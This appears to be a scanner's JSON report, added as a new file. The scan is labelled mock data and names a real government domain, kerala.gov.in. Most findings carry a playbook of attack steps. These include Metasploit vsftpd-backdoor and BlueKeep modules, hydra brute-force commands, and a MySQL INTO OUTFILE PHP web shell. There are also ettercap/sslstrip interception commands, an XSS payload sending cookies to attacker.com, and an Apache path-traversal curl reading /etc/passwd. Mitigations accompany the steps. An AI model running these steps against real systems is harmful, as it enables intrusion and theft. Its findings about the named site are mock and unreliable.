@@ -1,0 +1,499 @@
+{
+  "scan_id": "scan_0001",
+  "target": "kerala.gov.in",
+  "scan_type": "quick",
+  "nmap": {
+    "target": "kerala.gov.in",
+    "scan_type": "quick (mock)",
+    "ports": [
+      {
+        "port": 22,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "ssh",
+        "version": "OpenSSH 7.4"
+      },
+      {
+        "port": 80,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "http",
+        "version": "Apache httpd 2.4.29"
+      },
+      {
+        "port": 443,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "https",
+        "version": "nginx 1.14.0"
+      },
+      {
+        "port": 21,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "ftp",
+        "version": "vsftpd 2.3.4"
+      },
+      {
+        "port": 3306,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "mysql",
+        "version": "MySQL 5.7.28"
+      },
+      {
+        "port": 8080,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "http-proxy",
+        "version": ""
+      },
+      {
+        "port": 3389,
+        "protocol": "tcp",
+        "state": "open",
+        "service": "ms-wbt-server",
+        "version": "Microsoft Terminal Services"
+      }
+    ],
+    "raw": "Mock data - run on Kali Linux for real results",
+    "timestamp": "2026-06-02T00:11:47.405078"
+  },
+  "curl": {
+    "url": "http://kerala.gov.in",
+    "headers": {
+      "Server": "Apache/2.4.29 (Ubuntu)",
+      "X-Frame-Options": "SAMEORIGIN",
+      "X-Content-Type-Options": "nosniff",
+      "Content-Type": "text/html; charset=UTF-8"
+    },
+    "security_headers_present": [
+      "X-Frame-Options",
+      "X-Content-Type-Options"
+    ],
+    "security_headers_missing": [
+      "Strict-Transport-Security",
+      "Content-Security-Policy",
+      "X-XSS-Protection",
+      "Referrer-Policy",
+      "Permissions-Policy"
+    ],
+    "server": "Apache/2.4.29 (Ubuntu)"
+  },
+  "risks": {
+    "findings": [
+      {
+        "type": "version",
+        "port": 21,
+        "service": "ftp",
+        "severity": "Critical",
+        "color": "#ff2d55",
+        "title": "Vulnerable Version: vsftpd 2.3.4",
+        "description": "vsftpd 2.3.4 contains a backdoor (CVE-2011-2523).",
+        "recommendation": "Update to the latest stable version immediately.",
+        "cve": null,
+        "attack": {
+          "attack_name": "vsftpd 2.3.4 Backdoor Command Execution",
+          "attack_type": "Remote Code Execution",
+          "cve": "CVE-2011-2523",
+          "tools": [
+            "Metasploit (vsftpd_234_backdoor)",
+            "netcat"
+          ],
+          "impact": "Root shell without any credentials required.",
+          "steps": [
+            "Confirm version: nmap -sV -p 21 <target>",
+            "In Metasploit: msfconsole",
+            "use exploit/unix/ftp/vsftpd_234_backdoor",
+            "set RHOSTS <target>",
+            "run \u2192 instant root shell via backdoor on port 6200",
+            "Manual: telnet <target> 21 \u2192 USER :) \u2192 triggers backdoor \u2192 nc <target> 6200"
+          ],
+          "mitigation": "Upgrade vsftpd immediately. This version contains a deliberate backdoor."
+        }
+      },
+      {
+        "type": "port",
+        "port": 3389,
+        "service": "ms-wbt-server",
+        "severity": "Critical",
+        "color": "#ff2d55",
+        "title": "Port 3389 (ms-wbt-server) Open",
+        "description": "RDP \u2014 brute-force and exploit target.",
+        "recommendation": "Restrict to VPN, use NLA, keep patched.",
+        "cve": null,
+        "attack": {
+          "attack_name": "RDP Brute Force / BlueKeep (CVE-2019-0708)",
+          "attack_type": "Remote Code Execution / Credential Attack",
+          "cve": "CVE-2019-0708",
+          "tools": [
+            "Hydra",
+            "Crowbar",
+            "Metasploit (cve_2019_0708_bluekeep_rce)"
+          ],
+          "impact": "Full GUI desktop access, SYSTEM RCE, ransomware delivery.",
+          "steps": [
+            "Check BlueKeep vulnerability: nmap -p 3389 --script rdp-vuln-ms12-020 <target>",
+            "Brute force RDP: hydra -l Administrator -P rockyou.txt rdp://<target>",
+            "For BlueKeep RCE in Metasploit:",
+            "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+            "set RHOSTS <target> \u2192 set PAYLOAD \u2192 run",
+            "Once in: xfreerdp /u:Administrator /p:<found-pass> /v:<target>"
+          ],
+          "already_exploited_signs": [
+            "RDP sessions from unknown foreign IPs in Event Viewer (Event ID 4624)",
+            "Ransomware deployed",
+            "New local admin accounts"
+          ],
+          "mitigation": "Patch BlueKeep. Enable NLA. Restrict RDP to VPN only. Use strong passwords + MFA."
+        }
+      },
+      {
+        "type": "version",
+        "port": 22,
+        "service": "ssh",
+        "severity": "High",
+        "color": "#ff6b35",
+        "title": "Vulnerable Version: OpenSSH 7.4",
+        "description": "OpenSSH < 7.6 has user enumeration vulnerability (CVE-2018-15473).",
+        "recommendation": "Update to the latest stable version immediately.",
+        "cve": null,
+        "attack": {
+          "attack_name": "OpenSSH Username Enumeration",
+          "attack_type": "Information Disclosure",
+          "cve": "CVE-2018-15473",
+          "tools": [
+            "ssh_user_enum.py",
+            "Metasploit (ssh_enumusers)"
+          ],
+          "impact": "Valid usernames discovered \u2192 enables targeted brute force.",
+          "steps": [
+            "use auxiliary/scanner/ssh/ssh_enumusers in Metasploit",
+            "set RHOSTS <target>",
+            "set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt",
+            "run \u2192 lists valid vs invalid usernames based on timing difference",
+            "Then brute-force valid users: hydra -l <valid_user> -P rockyou.txt ssh://<target>"
+          ],
+          "mitigation": "Upgrade OpenSSH to 7.7+. Use fail2ban. Consider key-only authentication."
+        }
+      },
+      {
+        "type": "port",
+        "port": 21,
+        "service": "ftp",
+        "severity": "High",
+        "color": "#ff6b35",
+        "title": "Port 21 (ftp) Open",
+        "description": "FTP is unencrypted and often exploited.",
+        "recommendation": "Disable FTP; use SFTP/SCP instead.",
+        "cve": null,
+        "attack": {
+          "attack_name": "FTP Anonymous Login / Brute Force",
+          "attack_type": "Credential Attack",
+          "cve": "CVE-1999-0497",
+          "tools": [
+            "Hydra",
+            "Medusa",
+            "Metasploit (ftp_login)"
+          ],
+          "impact": "Unauthorised file read/write, data exfiltration, server takeover.",
+          "steps": [
+            "Confirm FTP is open: nmap -sV -p 21 <target>",
+            "Test anonymous login: ftp <target> \u2192 username: anonymous \u2192 password: <blank>",
+            "If anonymous fails, brute-force credentials: hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target>",
+            "Once logged in, list files: ls -la",
+            "Download sensitive files: get <filename>",
+            "Upload a web shell if web root is writable: put shell.php"
+          ],
+          "already_exploited_signs": [
+            "Unauthorised files in FTP directory",
+            "Login logs show \"anonymous\" from external IPs",
+            "Web shell found in /var/www/html"
+          ],
+          "mitigation": "Disable anonymous FTP. Switch to SFTP. Use strong credentials + IP whitelist."
+        }
+      },
+      {
+        "type": "port",
+        "port": 3306,
+        "service": "mysql",
+        "severity": "High",
+        "color": "#ff6b35",
+        "title": "Port 3306 (mysql) Open",
+        "description": "MySQL/MariaDB exposed.",
+        "recommendation": "Bind to 127.0.0.1, use strong credentials.",
+        "cve": null,
+        "attack": {
+          "attack_name": "MySQL Remote Access / SQL Injection",
+          "attack_type": "Database Attack",
+          "cve": "CVE-2012-2122",
+          "tools": [
+            "mysql client",
+            "SQLMap",
+            "Hydra",
+            "Metasploit"
+          ],
+          "impact": "Full database dump, data manipulation, OS command execution via MySQL.",
+          "steps": [
+            "Check if remotely accessible: nmap -sV -p 3306 <target>",
+            "Try default credentials: mysql -h <target> -u root -p (blank password)",
+            "Brute force: hydra -l root -P rockyou.txt mysql://<target>",
+            "Once in: SHOW DATABASES; USE target_db; SELECT * FROM users;",
+            "Dump credentials: SELECT user, password FROM mysql.user;",
+            "If FILE privilege: SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/shell.php';",
+            "OS command execution: sys_exec(\"id\") if UDF installed"
+          ],
+          "already_exploited_signs": [
+            "Unknown user accounts in mysql.user table",
+            "Web shell files in document root",
+            "Unexpected SELECT queries in slow query log"
+          ],
+          "mitigation": "Bind MySQL to 127.0.0.1. Use strong root password. Remove anonymous users. Disable FILE privilege."
+        }
+      },
+      {
+        "type": "header",
+        "port": null,
+        "service": "HTTP/HTTPS",
+        "severity": "High",
+        "color": "#ff6b35",
+        "title": "Missing Security Header: Strict-Transport-Security",
+        "description": "Missing HSTS allows downgrade attacks.",
+        "recommendation": "Add the \"Strict-Transport-Security\" HTTP response header on your web server.",
+        "cve": null,
+        "attack": {
+          "attack_name": "SSL Stripping / HTTPS Downgrade",
+          "attack_type": "Man-in-the-Middle",
+          "cve": null,
+          "tools": [
+            "sslstrip",
+            "Ettercap",
+            "mitmproxy"
+          ],
+          "impact": "Credentials and session tokens captured in plaintext.",
+          "steps": [
+            "Position attacker between victim and server (ARP spoofing): ettercap -T -q -i eth0 -M arp:remote /<gateway>// /<target>//",
+            "Strip HTTPS with sslstrip: sslstrip -l 8080",
+            "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080",
+            "Victim browses to http:// version of site \u2192 traffic is plaintext",
+            "Capture credentials in sslstrip.log"
+          ],
+          "mitigation": "Add header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
+        }
+      },
+      {
+        "type": "header",
+        "port": null,
+        "service": "HTTP/HTTPS",
+        "severity": "High",
+        "color": "#ff6b35",
+        "title": "Missing Security Header: Content-Security-Policy",
+        "description": "Missing CSP enables XSS attacks.",
+        "recommendation": "Add the \"Content-Security-Policy\" HTTP response header on your web server.",
+        "cve": null,
+        "attack": {
+          "attack_name": "Cross-Site Scripting (XSS)",
+          "attack_type": "Injection Attack",
+          "cve": null,
+          "tools": [
+            "Burp Suite",
+            "XSStrike",
+            "BeEF Framework"
+          ],
+          "impact": "Session hijacking, credential theft, drive-by malware delivery.",
+          "steps": [
+            "Find input fields: comments, search boxes, profile fields",
+            "Test basic XSS: <script>alert(document.cookie)</script>",
+            "Steal cookies: <script>document.location=\"http://attacker.com/?c=\"+document.cookie</script>",
+            "Use BeEF for browser exploitation: hook victim browser via XSS payload",
+            "Automated scan: xsstrike -u \"http://<target>/search?q=test\""
+          ],
+          "mitigation": "Add header: Content-Security-Policy: default-src 'self'"
+        }
+      },
+      {
+        "type": "version",
+        "port": 3306,
+        "service": "mysql",
+        "severity": "Medium",
+        "color": "#ffd60a",
+        "title": "Vulnerable Version: MySQL 5.7",
+        "description": "MySQL 5.7 EOL Jan 2023. Consider upgrading to 8.x.",
+        "recommendation": "Update to the latest stable version immediately.",
+        "cve": null,
+        "attack": {
+          "attack_name": "MySQL Remote Access / SQL Injection",
+          "attack_type": "Database Attack",
+          "cve": "CVE-2012-2122",
+          "tools": [
+            "mysql client",
+            "SQLMap",
+            "Hydra",
+            "Metasploit"
+          ],
+          "impact": "Full database dump, data manipulation, OS command execution via MySQL.",
+          "steps": [
+            "Check if remotely accessible: nmap -sV -p 3306 <target>",
+            "Try default credentials: mysql -h <target> -u root -p (blank password)",
+            "Brute force: hydra -l root -P rockyou.txt mysql://<target>",
+            "Once in: SHOW DATABASES; USE target_db; SELECT * FROM users;",
+            "Dump credentials: SELECT user, password FROM mysql.user;",
+            "If FILE privilege: SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/shell.php';",
+            "OS command execution: sys_exec(\"id\") if UDF installed"
+          ],
+          "already_exploited_signs": [
+            "Unknown user accounts in mysql.user table",
+            "Web shell files in document root",
+            "Unexpected SELECT queries in slow query log"
+          ],
+          "mitigation": "Bind MySQL to 127.0.0.1. Use strong root password. Remove anonymous users. Disable FILE privilege."
+        }
+      },
+      {
+        "type": "port",
+        "port": 8080,
+        "service": "http-proxy",
+        "severity": "Medium",
+        "color": "#ffd60a",
+        "title": "Port 8080 (http-proxy) Open",
+        "description": "HTTP Proxy / dev server exposed.",
+        "recommendation": "Do not expose staging servers publicly.",
+        "cve": null,
+        "attack": null
+      },
+      {
+        "type": "port",
+        "port": 22,
+        "service": "ssh",
+        "severity": "Low",
+        "color": "#34c759",
+        "title": "Port 22 (ssh) Open",
+        "description": "SSH is generally secure but should be hardened.",
+        "recommendation": "Disable root login, use key-based auth.",
+        "cve": null,
+        "attack": {
+          "attack_name": "SSH Brute Force / User Enumeration",
+          "attack_type": "Credential Attack / Information Disclosure",
+          "cve": "CVE-2018-15473",
+          "tools": [
+            "Hydra",
+            "Medusa",
+            "ssh-audit",
+            "Metasploit (ssh_enumusers)"
+          ],
+          "impact": "Full shell access, privilege escalation, lateral movement.",
+          "steps": [
+            "Enumerate valid usernames: msf > use auxiliary/scanner/ssh/ssh_enumusers",
+            "Set RHOSTS and USER_FILE, then run.",
+            "Brute-force valid user: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>",
+            "Login with found credentials: ssh root@<target>",
+            "Escalate privileges: sudo -l \u2192 exploit NOPASSWD entries"
+          ],
+          "already_exploited_signs": [
+            "/root/.ssh/authorized_keys contains unknown public keys",
+            "Unexpected cron jobs or new user accounts",
+            "Auth logs show thousands of failed attempts then a success"
+          ],
+          "mitigation": "Disable password auth (key-only). Disable root login. Use fail2ban. Enable MFA."
+        }
+      },
+      {
+        "type": "port",
+        "port": 80,
+        "service": "http",
+        "severity": "Low",
+        "color": "#34c759",
+        "title": "Port 80 (http) Open",
+        "description": "HTTP traffic is unencrypted.",
+        "recommendation": "Redirect all traffic to HTTPS.",
+        "cve": null,
+        "attack": {
+          "attack_name": "HTTP Downgrade / Directory Traversal / Web App Attacks",
+          "attack_type": "Web Application Attack",
+          "cve": "CVE-2021-41773",
+          "tools": [
+            "Nikto",
+            "Burp Suite",
+            "Gobuster",
+            "SQLMap"
+          ],
+          "impact": "Data theft, defacement, code execution, credential theft.",
+          "steps": [
+            "Scan for vulnerabilities: nikto -h http://<target>",
+            "Discover hidden directories: gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt",
+            "Test for SQL Injection: sqlmap -u \"http://<target>/page?id=1\" --dbs",
+            "Test for XSS: enter <script>alert(1)</script> in all input fields",
+            "Intercept requests in Burp Suite \u2192 modify parameters \u2192 test for IDOR",
+            "Check Apache path traversal (CVE-2021-41773): curl http://<target>/cgi-bin/.%2e/.%2e/etc/passwd"
+          ],
+          "already_exploited_signs": [
+            "Defaced index page",
+            "Unknown PHP/ASPX files in web root",
+            "Database records modified unexpectedly"
+          ],
+          "mitigation": "Force HTTPS. Keep web server patched. Use WAF. Validate all user input."
+        }
+      },
+      {
+        "type": "header",
+        "port": null,
+        "service": "HTTP/HTTPS",
+        "severity": "Low",
+        "color": "#34c759",
+        "title": "Missing Security Header: X-XSS-Protection",
+        "description": "Missing legacy XSS protection header.",
+        "recommendation": "Add the \"X-XSS-Protection\" HTTP response header on your web server.",
+        "cve": null,
+        "attack": null
+      },
+      {
+        "type": "header",
+        "port": null,
+        "service": "HTTP/HTTPS",
+        "severity": "Low",
+        "color": "#34c759",
+        "title": "Missing Security Header: Referrer-Policy",
+        "description": "Missing Referrer-Policy leaks URL in referrer.",
+        "recommendation": "Add the \"Referrer-Policy\" HTTP response header on your web server.",
+        "cve": null,
+        "attack": null
+      },
+      {
+        "type": "header",
+        "port": null,
+        "service": "HTTP/HTTPS",
+        "severity": "Low",
+        "color": "#34c759",
+        "title": "Missing Security Header: Permissions-Policy",
+        "description": "Missing Permissions-Policy exposes browser features.",
+        "recommendation": "Add the \"Permissions-Policy\" HTTP response header on your web server.",
+        "cve": null,
+        "attack": null
+      },
+      {
+        "type": "port",
+        "port": 443,
+        "service": "https",
+        "severity": "Info",
+        "color": "#5ac8fa",
+        "title": "Port 443 (https) Open",
+        "description": "HTTPS \u2014 check certificate validity.",
+        "recommendation": "Ensure TLS 1.2+ and strong cipher suites.",
+        "cve": null,
+        "attack": null
+      }
+    ],
+    "summary": {
+      "Critical": 2,
+      "High": 5,
+      "Medium": 2,
+      "Low": 5,
+      "Info": 1
+    },
+    "risk_score": 100,
+    "overall_risk": "Critical",
+    "overall_color": "#ff2d55",
+    "total_findings": 15
+  },
+  "timestamp": "2026-06-02T00:11:47.405078"
+}
